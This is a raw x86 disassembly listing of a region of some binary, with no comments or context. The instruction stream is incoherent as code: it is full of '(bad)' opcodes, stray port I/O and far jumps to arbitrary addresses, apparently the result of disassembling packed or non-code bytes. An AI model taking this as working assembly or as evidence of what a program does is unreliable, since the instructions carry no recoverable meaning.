  409ff2:	mov    ebp,0xfeec86cb
  409ff7:	jae    0x40a03f
  409ff9:	xor    dl,BYTE PTR [eax+edx*1-0x739b51bd]
  40a000:	mov    esi,0x81a3bd0c
  40a005:	push   edi
  40a006:	xor    al,0x9b
  40a008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a009:	fisubr DWORD PTR [edx+0x7d2a25e9]
  40a00f:	mov    ebx,?
  40a011:	inc    ebp
  40a012:	add    al,0xdb
  40a014:	mov    ch,0xb8
  40a016:	xor    edx,ebx
  40a018:	loop   0x409ff3
  40a01a:	mov    dh,0x36
  40a01c:	out    dx,eax
  40a01d:	ret    0x6d8a
  40a020:	ins    BYTE PTR es:[edi],dx
  40a021:	mov    edi,DWORD PTR [eax]
  40a023:	push   ss
  40a024:	mov    cl,0xcc
  40a026:	scas   al,BYTE PTR es:[edi]
  40a027:	mov    al,0x58
  40a029:	aam    0xf3
  40a02b:	sbb    ch,BYTE PTR [ecx]
  40a02d:	push   ebp
  40a02e:	sub    ebx,ebp
  40a030:	call   0x5724c47a
  40a035:	xor    DWORD PTR [edx-0x535925eb],ebx
  40a03b:	xor    edx,DWORD PTR ds:0x1e5c85d2
  40a041:	add    DWORD PTR [ebx+esi*8],esp
  40a044:	xchg   edx,eax
  40a045:	lods   al,BYTE PTR ds:[esi]
  40a046:	arpl   WORD PTR [edi+0x13],bx
  40a049:	xor    ch,BYTE PTR [esi+0x5fb40a4a]
  40a04f:	mov    edi,0x6bcca55e
  40a054:	(bad)  
  40a055:	and    eax,0xd0f05b34
  40a05a:	sbb    DWORD PTR [ecx],0xc6d76fc6
  40a060:	or     eax,0x691d585a
  40a065:	lods   eax,DWORD PTR ds:[esi]
  40a066:	and    al,0xdb
  40a068:	call   0xb6:0xe845d5e1
  40a06f:	sub    BYTE PTR [eax+0x1e],ah
  40a072:	mov    dh,0x9a
  40a074:	test   eax,0x846e1dae
  40a079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a07a:	stos   DWORD PTR es:[edi],eax
  40a07b:	mov    DWORD PTR [edx-0x6a9533d6],esi
  40a081:	test   eax,0x73fac227
  40a086:	xchg   edx,eax
  40a087:	leave  
  40a088:	outs   dx,BYTE PTR ds:[esi]
  40a089:	cld    
  40a08a:	mov    WORD PTR [ecx],fs
  40a08c:	mov    esi,0x87892c0c
  40a091:	shr    edi,1
  40a093:	std    
  40a094:	pop    ebx
  40a095:	pop    ebp
  40a096:	imul   edx,edx,0x39
  40a099:	fs ins BYTE PTR es:[edi],dx
  40a09b:	cmp    eax,0x2a84a9ab
  40a0a0:	push   ebx
  40a0a1:	scas   al,BYTE PTR es:[edi]
  40a0a2:	cld    
  40a0a3:	jge    0x40a0f7
  40a0a5:	xchg   DWORD PTR [ecx-0x2e6af9d7],esi
  40a0ab:	clc    
  40a0ac:	(bad)
  40a0af:	fs mov esi,0xb64de804
  40a0b5:	cmp    dl,BYTE PTR [edi]
  40a0b7:	ret    0xb3ac
  40a0ba:	rcl    DWORD PTR fs:[edx+edx*4-0x2d72b33],cl
  40a0c2:	mov    WORD PTR [eax],?
  40a0c4:	test   eax,0x86aae085
  40a0c9:	add    dh,BYTE PTR [edx]
  40a0cb:	fcomp  DWORD PTR ds:0x485390be
  40a0d1:	std    
  40a0d2:	xor    edx,DWORD PTR ds:0x17d2090e
  40a0d8:	jnp    0x40a13e
  40a0da:	dec    esi
  40a0db:	mov    edx,0x735752c6
  40a0e0:	inc    edx
  40a0e1:	pop    ebp
  40a0e2:	retf   0xb1af
  40a0e5:	aas    
  40a0e6:	popa   
  40a0e7:	xchg   DWORD PTR [ebx-0x6ad883d5],ecx
  40a0ed:	cmp    BYTE PTR [eax],bl
  40a0ef:	push   esp
  40a0f0:	sbb    ebp,DWORD PTR [edi+0x250127ff]
  40a0f6:	clc    
  40a0f7:	div    DWORD PTR [ebx-0x2d]
  40a0fa:	sub    eax,0xc7827746
  40a0ff:	and    DWORD PTR [edi+ecx*2+0x69],ebx
  40a103:	(bad)  
  40a104:	popa   
  40a105:	mov    al,0xa4
  40a107:	int3   
  40a108:	and    dl,BYTE PTR [ecx-0x80]
  40a10b:	cmc    
  40a10c:	mov    dh,0xa0
  40a10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a10f:	xchg   edx,eax
  40a110:	add    eax,0xe41243ac
  40a115:	xlat   BYTE PTR ds:[ebx]
  40a116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a117:	sbb    eax,0x179286a5
  40a11c:	xchg   ebx,eax
  40a11d:	mov    ds:0xe739f400,al
  40a122:	jne    0x40a17e
  40a124:	popf   
  40a125:	dec    esi
  40a126:	and    BYTE PTR [edi-0x1c14f71e],ah
  40a12c:	inc    edx
  40a12d:	test   cl,al
  40a12f:	cdq    
  40a130:	xor    eax,0x7994fd0b
  40a135:	(bad)  
  40a137:	mov    ds:0x80f7f569,eax
  40a13c:	adc    dl,BYTE PTR [ebx-0x5f]
  40a13f:	mov    edi,0xd7b5e16b
  40a144:	cmp    al,0xdb
  40a146:	cmp    BYTE PTR [ebx],0xf
  40a149:	sub    eax,0x63afead2
  40a14e:	pop    ecx
  40a14f:	stc    
  40a150:	retf   
  40a151:	or     esi,DWORD PTR [ecx+0x30af61c7]
  40a157:	adc    ch,BYTE PTR [ebx]
  40a159:	std    
  40a15a:	mov    WORD PTR [ecx],cs
  40a15c:	mov    ebp,0x2ace0c63
  40a161:	xor    DWORD PTR [ecx],ecx
  40a163:	popf   
  40a164:	fldcw  WORD PTR [edi-0x3c]
  40a167:	iret   
  40a168:	nop
  40a169:	jp     0x40a174
  40a16b:	cwde   
  40a16c:	pop    esi
  40a16d:	jne    0x40a195
  40a16f:	inc    ebp
  40a170:	sbb    al,0xb5
  40a172:	add    DWORD PTR [ecx+0x6b],esi
  40a175:	and    BYTE PTR [ebx+0x28f3b892],0x61
  40a17c:	aas    
  40a17d:	aad    0x50
  40a17f:	mov    esi,0xda6a18b7
  40a184:	dec    ecx
  40a185:	(bad)  
  40a186:	lahf   
  40a187:	jle    0x40a113
  40a189:	mov    ds:0x9cf79b92,al
  40a18e:	in     al,dx
  40a18f:	imul   eax,DWORD PTR [esi+0x2c],0xfa534404
  40a196:	daa    
  40a197:	aas    
  40a198:	in     al,dx
  40a199:	arpl   WORD PTR [edi-0x3848fa4c],ax
  40a19f:	lds    ebp,FWORD PTR [ecx+eax*2]
  40a1a2:	cmc    
  40a1a3:	push   ds
  40a1a4:	clc    
  40a1a5:	mov    eax,ds:0x5f624997
  40a1aa:	call   0x2ed4ea5f
  40a1af:	push   ecx
  40a1b0:	sub    eax,0x1ecc5a57
  40a1b5:	repnz idiv DWORD PTR [edx+esi*1-0xe]
  40a1ba:	stos   BYTE PTR es:[edi],al
  40a1bb:	mov    dl,0x2b
  40a1bd:	jmp    0xeff2:0x4a5c713a
  40a1c4:	out    0x3a,eax
  40a1c6:	data16 cmp dh,BYTE PTR [edi+esi*8]
  40a1ca:	pusha  
  40a1cb:	lds    ebp,FWORD PTR [edi-0x18]
  40a1ce:	mov    ecx,0xd7e42a06
  40a1d3:	adc    esp,DWORD PTR [ebp+0x47fa88cf]
  40a1d9:	out    dx,al
  40a1da:	push   esp
  40a1db:	scas   al,BYTE PTR es:[edi]
  40a1dc:	lods   al,BYTE PTR ds:[esi]
  40a1dd:	mov    edi,0x66ce2c77
  40a1e2:	or     eax,0xb3b37761
  40a1e7:	mov    esi,0x714f2c4b
  40a1ec:	xor    eax,0x658b810d
  40a1f1:	sbb    edi,esi
  40a1f3:	fbstp  TBYTE PTR [edi]
  40a1f5:	aas    
  40a1f6:	jne    0x40a1a5
  40a1f8:	call   0xd15d409b
  40a1fd:	shl    BYTE PTR [eax],1
  40a1ff:	pinsrw mm4,WORD PTR [eax-0x20],0x20
  40a204:	push   edi
  40a205:	dec    esp
  40a206:	xchg   ebx,eax
  40a207:	mov    DWORD PTR [eax+0x7c805e5d],esi
  40a20d:	sub    dh,bh
  40a20f:	and    eax,0x18506558
  40a214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a215:	mov    al,ds:0x13269b92
  40a21a:	pop    edi
  40a21b:	sbb    bh,BYTE PTR [esi]
  40a21d:	stc    
  40a21e:	sahf   
  40a21f:	popf   
  40a220:	xor    esp,ebx
  40a222:	add    BYTE PTR [ebp-0x6287a3e],0x20
  40a229:	or     edx,DWORD PTR [ebx-0x21]
  40a22c:	jmp    0x2c04:0x53a63807
  40a233:	pop    esi
  40a234:	fldcw  WORD PTR [edx]
  40a236:	icebp  
  40a237:	xchg   esi,eax
  40a238:	ror    bl,1
  40a23a:	push   0xfffffff1
  40a23c:	aad    0xae
  40a23e:	mov    DWORD PTR fs:[ecx],esp
  40a241:	fsub   st(0),st
  40a243:	mov    ah,0xfd
  40a245:	adc    al,0x72
  40a247:	push   edi
  40a248:	retf   0x82a1
  40a24b:	int3   
  40a24c:	ds repz xchg esp,eax
  40a24f:	mov    edi,0x56e7b812
  40a254:	lahf   
  40a255:	add    eax,0xcbcf71ef
  40a25a:	add    al,0xb8
  40a25c:	arpl   WORD PTR [edi+0x18],bx
  40a25f:	loopne 0x40a249
  40a261:	or     al,0x11
  40a263:	loop   0x40a20f
  40a265:	jns    0x40a267
  40a267:	mov    esi,0x3f0f9d45
  40a26c:	inc    esp
  40a26d:	ret    
  40a26e:	mov    bh,0x36
  40a270:	int3   
  40a271:	es and al,0x9c
  40a274:	adc    BYTE PTR [esi],bl
  40a276:	or     al,0x59
  40a278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a279:	xchg   ebp,eax
  40a27a:	gs adc eax,0x8c90641e
  40a280:	aaa    
  40a281:	add    eax,edx
  40a283:	outs   dx,DWORD PTR ds:[esi]
  40a284:	lahf   
  40a285:	xor    bl,0x7f
  40a288:	sar    bl,1
  40a28a:	ds push edi
  40a28c:	pop    esp
  40a28d:	dec    ebx
  40a28e:	scas   al,BYTE PTR es:[edi]
  40a28f:	mov    ah,BYTE PTR [eax]
  40a291:	out    0x50,eax
  40a293:	mov    esi,0x3028bc68
  40a298:	call   0xf0d0:0x74c4adba
  40a29f:	xchg   edi,eax
  40a2a0:	jp     0x40a2d8
  40a2a2:	cld    
  40a2a3:	push   ds
  40a2a4:	loop   0x40a311
  40a2a6:	fimul  WORD PTR [ecx]
  40a2a8:	jl     0x40a2f1
  40a2aa:	stos   DWORD PTR es:[edi],eax
  40a2ab:	sbb    eax,0x7dd88d6f
  40a2b0:	test   BYTE PTR [edx+eiz*4],al
  40a2b3:	in     eax,dx
  40a2b4:	inc    edi
  40a2b5:	stos   DWORD PTR es:[edi],eax
  40a2b6:	inc    eax
  40a2b7:	sbb    esp,edx
  40a2b9:	jg     0x40a2d3
  40a2bb:	test   al,0x65
  40a2bd:	cwde   
  40a2be:	(bad)  
  40a2bf:	jl     0x40a2a8
  40a2c1:	mov    al,0x98
  40a2c3:	clc    
  40a2c4:	lea    esp,[edi+0x5a]
  40a2c7:	cmc    
  40a2c8:	cmc    
  40a2c9:	xchg   DWORD PTR [ebx],esi
  40a2cb:	(bad)  
  40a2cc:	in     al,0xb7
  40a2ce:	add    al,0xb0
  40a2d0:	adc    DWORD PTR [esi+0x22f29c74],eax
  40a2d6:	call   0x96e6:0xc4f7f161
  40a2dd:	lods   al,BYTE PTR ds:[esi]
  40a2de:	push   ebp
  40a2df:	mov    esi,0x188d60fb
  40a2e4:	std    
  40a2e5:	mov    ebx,DWORD PTR ds:0xdf58d9fb
  40a2eb:	test   al,0xe0
  40a2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2ee:	dec    esi
  40a2ef:	pop    edi
  40a2f0:	ds dec ecx
  40a2f2:	push   ecx
  40a2f3:	sbb    ebp,edi
  40a2f5:	add    ah,BYTE PTR [ebp+0x5e76a38e]
  40a2fb:	inc    edi
  40a2fc:	mov    esp,0x379a4cb8
  40a301:	out    0x2d,al
  40a303:	jb     0x40a32d
  40a305:	pop    esi
  40a306:	iret   
  40a307:	dec    esp
  40a308:	(bad)  
  40a309:	(bad)  
  40a30a:	(bad)  
  40a30c:	xchg   ecx,eax
  40a30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a30e:	jo     0x40a301
  40a310:	ret    0xd255
  40a313:	inc    ebp
  40a314:	jmp    0x58ae:0x252354d0
  40a31b:	bound  edi,QWORD PTR [esi-0x2c]
  40a31e:	pop    ebx
  40a31f:	ficom  DWORD PTR [edi-0x57]
  40a322:	mov    bh,0x6c
  40a324:	(bad)  
  40a326:	add    al,0x95
  40a328:	outs   dx,DWORD PTR ds:[esi]
  40a329:	mov    bl,0x46
  40a32b:	repz jecxz 0x40a376
  40a32e:	aas    
  40a32f:	push   ss
  40a330:	mov    bl,0xb0
  40a332:	scas   al,BYTE PTR es:[edi]
  40a333:	ret    0xadd4
  40a336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a337:	data16 out 0x22,al
  40a33a:	imul   ecx,DWORD PTR [edi],0xffffffe3
  40a33d:	adc    eax,edi
  40a33f:	jg     0x40a3bc
  40a341:	retf   
  40a342:	xor    al,0xf5
  40a344:	mov    edi,0xc1942585
  40a349:	(bad)  
  40a34a:	into   
  40a34b:	cld    
  40a34c:	push   esi
  40a34d:	sbb    dh,BYTE PTR [ebx+eax*8]
  40a350:	push   eax
  40a351:	jo     0x40a346
  40a353:	cs (bad) 
  40a355:	mov    eax,ds:0xaad49562
  40a35a:	mov    WORD PTR [esi+0x3c],ss
  40a35d:	ins    DWORD PTR es:[edi],dx
  40a35e:	sub    eax,eax
  40a360:	push   esp
  40a361:	not    DWORD PTR [edi-0x29]
  40a364:	cmp    al,0x9e
  40a366:	ins    BYTE PTR es:[edi],dx
  40a367:	jmp    0x3daf4a7
  40a36c:	outs   dx,DWORD PTR ds:[esi]
  40a36d:	in     eax,dx
  40a36e:	sub    DWORD PTR [ecx],ebp
  40a370:	pop    esi
  40a371:	sahf   
  40a372:	xchg   esi,eax
  40a373:	xchg   esi,eax
  40a374:	or     eax,0xb92cf527
  40a379:	loop   0x40a3e0
  40a37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a37c:	fidiv  DWORD PTR [ecx+0x78cbcaa9]
  40a382:	and    DWORD PTR [edi],ebp
  40a384:	or     eax,0x3539fbbd
  40a389:	and    DWORD PTR [edx-0x206e545e],0xffffffee
  40a390:	sbb    BYTE PTR [eax-0xd3e360f],bh
  40a396:	adc    BYTE PTR [eax+0x2a8cdf39],al
  40a39c:	cmp    eax,0x134f8544
  40a3a1:	test   dh,dl
  40a3a3:	push   esi
  40a3a4:	neg    ebp
  40a3a6:	xchg   edx,eax
  40a3a7:	pop    esp
  40a3a8:	push   esp
  40a3a9:	mov    ebx,0x242a7285
  40a3ae:	xor    bh,bh
  40a3b0:	mov    bl,0x83
  40a3b2:	and    DWORD PTR [ecx],0xffffff9d
  40a3b5:	stos   BYTE PTR es:[edi],al
  40a3b6:	xlat   BYTE PTR ds:[ebx]
  40a3b7:	mov    bh,BYTE PTR [edi]
  40a3b9:	or     eax,0xca3155f3
  40a3be:	aas    
  40a3bf:	mov    al,ds:0x656e3e1b
  40a3c4:	sub    esp,DWORD PTR [eax]
  40a3c6:	pop    ecx
  40a3c7:	ret    0x74c7
  40a3ca:	sub    al,0x7e
  40a3cc:	repnz clc 
  40a3ce:	pop    ss
  40a3cf:	das    
  40a3d0:	mov    esp,0xc23503a6
  40a3d5:	mov    edx,0x37a747dc
  40a3da:	add    cl,BYTE PTR ss:[esi+0x31578b4c]
  40a3e1:	dec    edx
  40a3e2:	xchg   esp,eax
  40a3e3:	cld    
  40a3e4:	hlt    
  40a3e5:	jl     0x40a375
  40a3e7:	stos   BYTE PTR es:[edi],al
  40a3e8:	ins    DWORD PTR es:[edi],dx
  40a3e9:	ret    
  40a3ea:	mov    eax,0x3ac578cd
  40a3ef:	sbb    BYTE PTR [esi],0x96
  40a3f2:	sub    BYTE PTR [ecx],bl
  40a3f4:	xor    ebp,DWORD PTR [eax]
  40a3f6:	scas   eax,DWORD PTR es:[edi]
  40a3f7:	pop    ecx
  40a3f8:	add    ecx,ebp
  40a3fa:	pop    ss
  40a3fb:	sub    al,0x2a
  40a3fd:	psubusb mm1,QWORD PTR [ecx-0x25]
  40a401:	sub    al,0x98
  40a403:	imul   ebp,DWORD PTR [ecx],0xffffffea
  40a406:	jg     0x40a3b6
  40a408:	enter  0xd03e,0x99
  40a40c:	(bad)  
  40a40d:	clc    
  40a40e:	push   cs
  40a40f:	mov    ebx,0xcd8fdbc6
  40a414:	loopne 0x40a431
  40a416:	pop    ds
  40a417:	inc    esp
  40a418:	scas   al,BYTE PTR es:[edi]
  40a419:	inc    ecx
  40a41a:	pop    ecx
  40a41b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40a41d:	add    eax,0x99458cda
  40a422:	push   ss
  40a423:	cmp    BYTE PTR [esi+0x6c],dl
  40a426:	xchg   esp,eax
  40a427:	xchg   BYTE PTR [ecx-0x80],ah
  40a42a:	sub    eax,ebp
  40a42c:	data16 sbb al,0x67
  40a42f:	ja     0x40a471
  40a431:	dec    ecx
  40a432:	lods   al,BYTE PTR ds:[esi]
  40a433:	jge    0x40a445
  40a435:	add    dl,bh
  40a437:	sub    DWORD PTR [eax+edx*1+0x2f33a59a],esp
  40a43e:	dec    esi
  40a43f:	xchg   edi,eax
  40a440:	mov    eax,ds:0x7a71b7a4
  40a445:	bnd jns 0x40a43f
  40a448:	imul   edx,DWORD PTR [esi+0x2a64a349],0x55
  40a44f:	xchg   edi,eax
  40a450:	xor    ebp,esi
  40a452:	xchg   esi,eax
  40a453:	xchg   edi,eax
  40a454:	dec    esp
  40a455:	std    
  40a456:	xchg   BYTE PTR [eax],ah
  40a458:	jmp    0x12213389
  40a45d:	popa   
  40a45e:	jmp    0x2eaf:0x9a5086f6
  40a465:	mov    ecx,0x18dc8e10
  40a46a:	mov    esi,0x39dabae6
  40a46f:	or     ah,cl
  40a471:	stc    
  40a472:	jg     0x40a3f9
  40a474:	in     eax,0x74
  40a476:	cdq    
  40a477:	rcl    BYTE PTR [esi-0x4fe9eb9a],0xec
  40a47e:	jmp    0xe642:0x9314eb5b
  40a485:	and    al,0xed
  40a487:	mov    eax,0x30ab2c76
  40a48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a48d:	(bad)  
  40a48e:	mov    eax,0xca156b5f
  40a493:	stos   DWORD PTR es:[edi],eax
  40a494:	and    al,0x6f
  40a496:	je     0x40a4db
  40a498:	mov    ecx,0xc3515e5
  40a49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a49e:	iret   
  40a49f:	test   dh,bl
  40a4a1:	inc    esp
  40a4a2:	mov    bl,0x4e
  40a4a4:	or     esp,edx
  40a4a6:	add    edx,DWORD PTR [eax+0x622d6249]
  40a4ac:	(bad)  
  40a4ad:	jae    0x40a4ca
  40a4af:	outs   dx,BYTE PTR ds:[esi]
  40a4b0:	jg     0x40a4a8
  40a4b2:	cmc    
  40a4b3:	loopne 0x40a44d
  40a4b5:	cdq    
  40a4b6:	imul   ebx,edi,0xaa0b5dd0
  40a4bc:	fcmovu st,st(5)
  40a4be:	xchg   DWORD PTR [ebp-0x7792c3ff],eax
  40a4c4:	mov    WORD PTR [edx],ss
  40a4c6:	jns    0x40a4fd
  40a4c8:	jmp    0x40a547
  40a4ca:	or     DWORD PTR [ebx],0x7f
  40a4cd:	dec    esi
  40a4ce:	mov    ecx,0xa74ab9d0
  40a4d3:	lahf   
  40a4d4:	pop    eax
  40a4d5:	adc    ebx,DWORD PTR [edx+0x26027f06]
  40a4db:	pop    edx
  40a4dc:	lds    ebp,FWORD PTR [edi]
  40a4de:	(bad)  [esi-0x47]
  40a4e1:	popf   
  40a4e2:	iret   
  40a4e3:	or     al,0x48
  40a4e5:	leave  
  40a4e6:	mov    dl,0xdf
  40a4e8:	pop    ds
  40a4e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4ea:	add    BYTE PTR [esi+0xfb1a7e3],0xe2
  40a4f1:	mov    ebx,0xd6f16ea2
  40a4f6:	repnz mov eax,edx
  40a4f9:	dec    esi
  40a4fa:	push   ecx
  40a4fb:	fisubr DWORD PTR [ecx+0x7ea35468]
  40a501:	fnstcw WORD PTR [eax]
  40a503:	pop    esi
  40a504:	cwde   
  40a505:	icebp  
  40a506:	jl     0x40a575
  40a508:	xlat   BYTE PTR ds:[ebx]
  40a509:	or     al,0x7c
  40a50b:	cmp    DWORD PTR [bx+di+0x3d],ebx
  40a50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a510:	xchg   ebx,eax
  40a511:	jle    0x40a502
  40a513:	idiv   DWORD PTR [edx]
  40a515:	rcr    DWORD PTR [edx+0x72],0x5
  40a519:	push   es
  40a51a:	inc    esp
  40a51b:	jb     0x40a54c
  40a51d:	dec    esi
  40a51e:	dec    ah
  40a520:	call   0xa7523762
  40a525:	or     al,BYTE PTR [edi]
  40a527:	adc    edi,DWORD PTR [ebx+edi*2-0x17]
  40a52b:	push   cs
  40a52c:	mov    bh,0xb8
  40a52e:	test   al,0x29
  40a530:	xchg   esi,eax
  40a531:	hlt    
  40a532:	bound  esp,QWORD PTR ds:0xa089e8ca
  40a538:	test   eax,0x904c840a
  40a53d:	mov    ebx,DWORD PTR [ebx-0x5b]
  40a540:	mov    ds:0x51c3b454,eax
  40a545:	mov    ah,BYTE PTR [edi-0x3]
  40a548:	mov    ch,0x72
  40a54a:	xor    DWORD PTR [bx-0x12],0xffffffc9
  40a54f:	not    edi
  40a551:	mov    edx,DWORD PTR [ebx]
  40a553:	xor    edx,edi
  40a555:	scas   eax,DWORD PTR es:[edi]
  40a556:	and    bh,cl
  40a558:	xor    al,0xc
  40a55a:	add    ch,BYTE PTR ds:0x59da12aa
  40a560:	xor    bl,al
  40a562:	outs   dx,BYTE PTR ds:[esi]
  40a563:	lods   al,BYTE PTR ds:[esi]
  40a564:	dec    esp
  40a565:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40a567:	mov    edi,0x733bc735
  40a56c:	jns    0x40a51a
  40a56e:	cmc    
  40a56f:	pop    edx
  40a570:	dec    esi
  40a571:	cdq    
  40a572:	mov    bh,0x65
  40a574:	je     0x40a594
  40a576:	test   edi,0xb71b6c50
  40a57c:	pop    eax
  40a57d:	sbb    eax,0xab34110d
  40a582:	cdq    
  40a583:	xchg   esp,eax
  40a584:	mov    WORD PTR [edx+ecx*2+0x76706ef1],?
  40a58b:	pop    esi
  40a58c:	pop    ds
  40a58d:	mov    BYTE PTR gs:[eax],ah
  40a590:	inc    ebx
  40a591:	mov    ebx,0x2233f56e
  40a596:	push   edx
  40a597:	stc    
  40a598:	inc    ebp
  40a599:	jnp    0x40a5ff
  40a59b:	or     bl,dh
  40a59d:	pusha  
  40a59e:	scas   al,BYTE PTR es:[edi]
  40a59f:	iret   
  40a5a0:	call   0x24ed:0x4335b14c
  40a5a7:	mov    eax,ds:0x303d0902
  40a5ac:	jecxz  0x40a53d
  40a5ae:	cdq    
  40a5af:	cmp    BYTE PTR [eax+0x1693f160],bh
  40a5b5:	and    BYTE PTR [esi],0x3b
  40a5b8:	add    DWORD PTR [ecx+0x1d],edi
  40a5bb:	mov    ds:0xa28683d,eax
  40a5c0:	outs   dx,DWORD PTR ds:[esi]
  40a5c1:	or     eax,0xe42ec6f5
  40a5c6:	xlat   BYTE PTR ds:[ebx]
  40a5c7:	pop    ds
  40a5c8:	and    eax,0xdef95ad5
  40a5cd:	arpl   WORD PTR [ecx+0x17ab2ea7],si
  40a5d3:	(bad)  
  40a5d4:	imul   edx,ebp,0x9f14a4e
  40a5da:	in     al,dx
  40a5db:	mov    ah,0x5c
  40a5dd:	popf   
  40a5de:	mov    ds:0x268c4cbe,al
  40a5e3:	loopne 0x40a597
  40a5e5:	gs jmp 0x121e4da0
  40a5eb:	mov    DWORD PTR [ebp+0x1e],edx
  40a5ee:	jo     0x40a64e
  40a5f0:	(bad)  
  40a5f1:	push   esp
  40a5f2:	mov    WORD PTR [ebx+0x2e],ds
  40a5f5:	lds    ebx,FWORD PTR [esi+0x43]
  40a5f8:	mov    bh,0x57
  40a5fa:	sub    BYTE PTR [esi-0x134ead83],cl
  40a600:	jmp    0x8cc2:0x179cf145
  40a607:	jnp    0x40a5da
  40a609:	aaa    
  40a60a:	adc    ah,ch
  40a60c:	mov    edx,0xfddb8708
  40a611:	add    DWORD PTR [edx+0x19],ebp
  40a614:	sub    cl,BYTE PTR [ebp+ebx*4+0x273f621d]
  40a61b:	daa    
  40a61c:	or     ebx,ecx
  40a61e:	jbe    0x40a637
  40a620:	mov    edx,0xfb6305f7
  40a625:	sti    
  40a626:	lods   al,BYTE PTR ds:[esi]
  40a627:	outs   dx,DWORD PTR ds:[esi]
  40a628:	out    0x90,eax
  40a62a:	cmp    eax,0x3f4feb4d
  40a62f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a630:	dec    eax
  40a631:	mov    dl,0x85
  40a633:	push   eax
  40a634:	ret    0x2d39
  40a637:	rcr    DWORD PTR [ebx-0x8],0x45
  40a63b:	mov    al,0x13
  40a63d:	outs   dx,DWORD PTR ds:[esi]
  40a63e:	pop    edx
  40a63f:	mov    cl,0xd3
  40a641:	je     0x40a63b
  40a643:	cmp    al,BYTE PTR [ebx+0xacebd1a]
  40a649:	fwait
  40a64a:	stos   DWORD PTR es:[edi],eax
  40a64b:	(bad)  [ecx+0x5f]
  40a64e:	in     al,0x63
  40a650:	or     eax,0xba62b7dd
  40a655:	jmp    0x40a656
  40a657:	rol    DWORD PTR ds:0xe6a6fee3,0xdb
  40a65e:	mov    al,ch
  40a660:	sbb    esp,esi
  40a662:	repz push edi
  40a664:	std    
  40a665:	popa   
  40a666:	mov    edx,0xcf0a8c14
  40a66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66c:	mov    eax,ds:0x8d25e69c
  40a671:	je     0x40a5f5
  40a673:	inc    eax
  40a674:	retf   
  40a675:	mov    al,0x6c
  40a677:	aam    0x6a
  40a679:	xor    ebp,DWORD PTR [edi-0x53f96ea2]
  40a67f:	ret    0xec69
  40a682:	mov    eax,ds:0x8190ea60
  40a687:	jg     0x40a68e
  40a689:	or     eax,0xcf885b1c
  40a68e:	in     eax,0x44
  40a690:	sub    eax,0xf60fc1c
  40a695:	mov    eax,0xfb5283cf
  40a69a:	imul   esp,DWORD PTR [edi-0x1a],0xffffffc2
  40a69e:	lods   eax,DWORD PTR ds:[esi]
  40a69f:	pop    esp
  40a6a0:	loop   0x40a64e
  40a6a2:	fld    QWORD PTR [ecx+eax*1]
  40a6a5:	out    dx,eax
  40a6a6:	xor    al,0x58
  40a6a8:	dec    ecx
  40a6a9:	add    DWORD PTR [eax-0x1e],ebx
  40a6ac:	iret   
  40a6ad:	ffreep st(0)
  40a6af:	loop   0x40a710
  40a6b1:	fcomi  st,st(5)
  40a6b3:	jo     0x40a6a5
  40a6b5:	clc    
  40a6b6:	xchg   DWORD PTR [esi-0x2569a738],eax
  40a6bc:	(bad)  
  40a6bd:	xor    BYTE PTR [ebx],bl
  40a6bf:	call   0x9697dcef
  40a6c4:	imul   DWORD PTR [edi]
  40a6c6:	inc    ecx
  40a6c7:	mov    ebp,0x607df4e8
  40a6cc:	arpl   ax,dx
  40a6ce:	sub    dh,BYTE PTR [esi-0x1a]
  40a6d1:	sub    eax,0xdd826bd2
  40a6d6:	out    dx,eax
  40a6d7:	shld   DWORD PTR [eax],ecx,0x8f
  40a6db:	xor    edi,DWORD PTR [ecx]
  40a6dd:	jmp    0x40a681
  40a6df:	add    BYTE PTR [ebp+0x5c320528],0x64
  40a6e6:	xlat   BYTE PTR ds:[ebx]
  40a6e7:	push   cs
  40a6e8:	dec    edx
  40a6e9:	sub    DWORD PTR [ecx],ecx
  40a6eb:	fcmovnbe st,st(0)
  40a6ed:	pop    DWORD PTR ds:0x125d62d8
  40a6f3:	jb     0x40a6dc
  40a6f5:	pop    ecx
  40a6f6:	or     bl,BYTE PTR gs:[ebx]
  40a6f9:	mov    ah,0xee
  40a6fb:	push   ebx
  40a6fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6fd:	out    dx,eax
  40a6fe:	sub    bh,dh
  40a700:	xchg   ebx,eax
  40a701:	push   edx
  40a702:	xchg   esp,eax
  40a703:	sub    BYTE PTR [ecx+0x6e183684],bh
  40a709:	in     al,0x47
  40a70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a70c:	push   eax
  40a70d:	fstp   TBYTE PTR [ebx]
  40a70f:	gs stos DWORD PTR es:[edi],eax
  40a711:	retf   0x14d8
  40a714:	mov    esp,0xbf771c6f
  40a719:	push   ebp
  40a71a:	xor    ax,cx
  40a71d:	pop    ss
  40a71e:	dec    esi
  40a71f:	jns    0x40a792
  40a721:	mov    esi,0x3fa2b99
  40a726:	inc    esp
  40a727:	cmp    eax,0xd6006007
  40a72c:	add    BYTE PTR [edx],ah
  40a72e:	pop    esp
  40a72f:	mov    edi,0x8b4365d
  40a734:	ret    
  40a735:	aam    0x52
  40a737:	ror    BYTE PTR [ebx+0x3a],0x24
  40a73b:	das    
  40a73c:	pop    edx
  40a73d:	pop    ss
  40a73e:	jns    0x40a7ab
  40a740:	mov    BYTE PTR [edi],0xe2
  40a743:	push   ebx
  40a744:	pop    edi
  40a745:	pop    esp
  40a746:	xchg   esp,eax
  40a747:	stos   BYTE PTR es:[edi],al
  40a748:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
